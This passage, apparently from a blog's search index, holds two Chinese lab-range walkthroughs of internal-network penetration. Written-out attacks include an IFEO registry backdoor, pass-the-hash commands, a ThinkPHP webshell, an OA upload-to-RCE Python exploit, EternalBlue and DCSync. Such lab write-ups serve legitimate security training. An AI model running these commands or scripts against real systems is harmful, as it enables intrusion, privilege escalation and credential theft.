class="line">get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</span><br></pre></td></tr></table></figure><p>发现只要通过身份验证的用户，就可以修改该注册表<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115151720.png"></p><p>通过修改注册表，windows系统运行每个程序时，都会在HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options中查找相应的程序，如果存在，那么就会进一步查找是否存在Debugger值，并会在程序运行时优先运行Debugger项所指定的程序。这样就可以将放大镜的程序替换成cmd窗口，当点击放大镜时，就会打开cmd窗口，从而就能拿到system的cmd窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115151652.png"></p><p>将window锁屏后，点击右下角的放大镜</p><p><img src="/img/31d6b0fb41d568e3711961a9dc326028_MD5.jpeg"></p><p>点击后弹出cmd窗口</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115145922.png"></p><p>通过该cmd窗口，执行CS生成的木马，从而上线一个具有system权限的机器</p><p>执行木马<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115150413.png"></p><p>上线CS<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115150434.png"><br>先使用dir查找是否有Flag,找到以后</p><p>使用type 查看flag02<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115150625.png"></p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>使用CS继续46这台机器信息收集<br><code> shell net user /domain</code><br><code>shell net group &quot;domain admins&quot; /domain</code><br>发现拿下的46这台机器的机器账户在域管理员组，且我们CS已经有system的权限<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115151312.png"></p><p>因此可以使用logonpasswords，去找机器账户的hash</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115151223.png"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>得到机器的hash后，利用crackmapexec横向移动到域控上，并查看flag03.txt.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H 2c66200c70475bd322b880f813f34d7a -d xiaorang -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250115151517.png"></p><h3 id="其他两种横向移动方法"><a href="#其他两种横向移动方法" class="headerlink" title="其他两种横向移动方法"></a>其他两种横向移动方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:2c66200c70475bd322b880f813f34d7a&quot; exit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbexec.py -hashes :2c66200c70475bd322b880f813f34d7a administrator@172.22.8.15</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Privilege Elevation </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> MSSQL </tag>
            
            <tag> Kerberos </tag>
            
            <tag> RDP </tag>
            
            <tag> 春秋云境Tsclient </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-initial</title>
      <link href="/2025/01/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/"/>
      <url>/2025/01/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/</url>
      
        <content type="html"><![CDATA[<h1 id="initial"><a href="#initial" class="headerlink" title="initial"></a>initial</h1><p>漏洞点</p><ul><li>thinkphp 5.0.23 RCE</li><li>mysql命令提权</li><li>信呼nday</li><li>ms17-010(永恒之蓝)</li><li>DCSync</li></ul><p>拿到ip后使用fscan扫描<code>fscan -h 39.99.237.93</code>发现存在thinkphp的rce</p><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><ol><li>使用thinkphp利用工具<br><a href="https://github.com/Lotus6/ThinkphpGUI">https://github.com/Lotus6/ThinkphpGUI</a><br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113190300.png"></li><li>检测漏洞<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113190635.png"></li><li>利用漏洞上传一句话木马<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113190747.png"></li><li>使用蚁剑连接,密码为peiqi<br> 执行id ，发现用户为www-data的低权限用户<br> 使用sudo -l命令发现mysql无需密码就可提权</li><li>提权<br> 使用命令找到flag01目录<br> <code>sudo mysql -e &#39;\! find / -name flag*&#39;</code><br> 查看flag01<br> <code>sudo mysql -e &#39;\! cat /root/flag/f*&#39;</code><br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113195159.png"></li></ol><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>使用ifconfig查看ip ,看到39.99.237.93还有内网ip172.22.1.15</p><ol><li><p>内网扫描<br> 上传fscan到tmp目录下，所有用户tmp目录都可写。  </p><p> 扫描存活主机<code>fscan -h 172.22.1.0/24</code>,执行命令后会生成result.txt<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113200011.png"><br> 得到结果<br> 172.22.1.2   DC<br> 172.22.1.18  信呼OA<br> 172.22.1.21  MS17-010</p></li><li><p>frp内网穿透<br> 由于本机无法直接访问目标内网服务，需要将拿下的第一台机器172.22.1.15的内网流量转发到攻击者的公网服务器上，本机再使用代理工具就可以访问内网服务了;</p></li><li><p><strong>172.22.1.15</strong>执行如下命令(公网服务器先执行监听，内网ip后执行)<br> <code>./frpc -c frpc.toml</code><br> <strong>frpc.toml配置如下</strong></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;公网ip&quot;</span><br><span class="line">serverPort = 7777#监听端口</span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;test-tcp&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">plugin = &quot;socks5&quot;</span><br><span class="line">localIP = &quot;172.22.1.15&quot;#内网ip</span><br><span class="line">localPort = 80</span><br><span class="line">remotePort = 6000#远程连接端口</span><br></pre></td></tr></table></figure><ol start="4"><li><p>公网IP执行如下命令<br> <code>./frps -c frps.toml</code><br> 执行前需要chmod 777 frps 给予其执行权限<br> 配置监听7777端口即可<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113202422.png"><br> 当内网ip执行命令后回显如下<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113202901.png"></p></li><li><p>使用Proxifier代理工具<br> <strong>配置代理服务器</strong><br> 地址为攻击者公网ip、端口为监听端口<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113202148.png"><br> 填好后先点击左下角的检查看看是否代理成功<br> <strong>配置代理规则</strong><br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113203211.png"><br> 配置完成后本机即可访问其他内网资源</p></li><li><p>访问172.22.1.18  信呼OA<br>  存在admin&#x2F;admin123弱口令，登陆后如下</p><p>  <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113203404.png"><br>  搜索OA版本号即可找到漏洞exp</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> requests</span><br><span class="line"> session = requests.session()</span><br><span class="line"> url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line"> url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line"> url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"> url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"> data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br></pre></td></tr></table></figure><ol start="7"><li>使用172.22.1.15机器执行exp<br> 执行前需在和脚本同一目录下放一个1.php的一句话木马<br> 执行成功后就可以连接一句话木马，链接如图<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113204641.png"></li><li>连接一句话木马后，查找flag<br> 执行命令<code>dir C:\flag* /s /p</code>查找C盘下的文件，找到flag02文件<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113205027.png"><br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113205109.png"><br> 提示下一个flag在域控中</li></ol><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>前面fscan扫描得到172.22.1.21 存在MS17-010永恒之蓝,由于没有直接登录域控的方法，可以通过ms17-010拿到21机器的shell，然后利用Dcsync滥用获取管理员hash,横向移动登录域控查看flag03</p><ol><li><strong>配置kali代理</strong><br> <code>vim /etc/proxychains4.conf </code><br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113210652.png"></li><li><strong>代理启动msf</strong><br> <code>proxychains4 msfconsole</code><br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113210832.png"></li><li><strong>漏洞利用-&gt;获得21机器system权限的shell</strong><br> use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue<br> set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp_uuid<br> set RHOSTS 172.22.1.21<br> run<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113211215.png"></li><li><strong>Dcsync滥用获取hash</strong><br> <strong>DCSync攻击:</strong><br> DCSync的原理是利用域控制器之间的数据同步复制<br> DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS- DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据，由于这种攻击利用了Windows RPC协议，并不需要登陆域控或者在域控上落地文件，避免触发EDR告警，因此DCSync时一种非常隐蔽的凭据窃取方式<br> <strong>用kali加载kiwi模块以便于Dcsync利用</strong><br> <code>load kiwi  </code>kiwi_cmd “lsadump::dcsync &#x2F;domain:xiaorang.lab &#x2F;all &#x2F;csv” exit&#96;<br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113212107.png"><br> 得到所有用户hash</li><li><strong>横向移动查看flag03</strong><br> 使用crackmapexec横向移动<br> <code>proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</code><br> <img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250113212955.png"><br> 得到flag03</li></ol>]]></content>
      
      
      <categories>
          
          <category> 内网渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
            <tag> DCSync </tag>
            
            <tag> CVE </tag>
            
            <tag> 春秋云境initial </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
